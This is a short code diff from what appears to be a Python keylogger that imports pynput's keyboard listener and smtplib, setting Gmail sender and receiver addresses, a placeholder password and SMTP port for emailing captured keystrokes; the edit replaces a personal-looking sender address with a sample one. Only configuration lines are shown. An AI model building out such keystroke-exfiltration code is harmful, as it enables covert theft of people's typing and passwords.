@@ -1,7 +1,7 @@
   from pynput import keyboard
   import smtplib,ssl
 
-  sender_mail = "arielyap58@gmail.com"
+  sender_mail = "arielsample@gmail.com"
   receiver_mail = "arielsample@gmail.com"
   password = "emailpassoword"
   port = 587
